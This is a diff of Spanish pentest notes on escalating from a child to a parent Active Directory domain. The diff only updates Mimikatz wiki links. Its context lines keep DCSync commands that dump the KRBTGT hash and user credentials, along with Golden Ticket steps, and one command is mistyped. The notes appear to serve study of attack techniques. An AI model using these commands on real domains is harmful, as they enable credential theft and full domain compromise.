@@ -22,8 +22,8 @@ Este ataque permite comprometer un dominio `principal(parent)` una vez compromet
 
 **Todas las fases enumeradas a continuación se harán desde la maquina comprometida del dominio secundario(child)**
 ### Obtención del hash de la cuenta KRBTGT
-Una vez hemos obtenido el control total en el dominio secundario(child) deberemos obtener el `HASH KRBTGT` usando [[MIMIKATZ]]
-Ejecutamos [[MIMIKATZ]] y lanzamos el comando
+Una vez hemos obtenido el control total en el dominio secundario(child) deberemos obtener el `HASH KRBTGT` usando [[00.- Herramientas/MIMIKATZ]]
+Ejecutamos [[00.- Herramientas/MIMIKATZ]] y lanzamos el comando
 
 ```shell
 lsadum::dcsync /usr:<domain>\krbtgt
@@ -56,7 +56,7 @@ Get-DomainGroup -Domain <Dominio.Principal> -Identity "Enterprise Admins" | sele
 
 ## Golden Ticket
 ### Explotación -> MIMIKATZ
-Podemos realizar la explotación después de obtener toda la información usando [[MIMIKATZ]]
+Podemos realizar la explotación después de obtener toda la información usando [[00.- Herramientas/MIMIKATZ]]
 Creando primero el `GOLDEN TICKET`
 
 ```shell
@@ -82,7 +82,7 @@ klist
 Para validar que el ticket se encuentra en la memoria, viendo que se encuentra ahí desde nustro dominio secundario(child) podemos ver el dominio principal y escalarlo a un ataque `DCSync`
 
 # DCSync Attack
-Usando la herramienta de [[MIMIKATZ]] podemos ejecutar este ataque para obtener las credenciales de un usuario de la maquina de dominio principal(parent)
+Usando la herramienta de [[00.- Herramientas/MIMIKATZ]] podemos ejecutar este ataque para obtener las credenciales de un usuario de la maquina de dominio principal(parent)
 
 ```shell
 lsadump::dcsync /user:<Dominio.Principal>\user /domain:<Dominio.Principal>
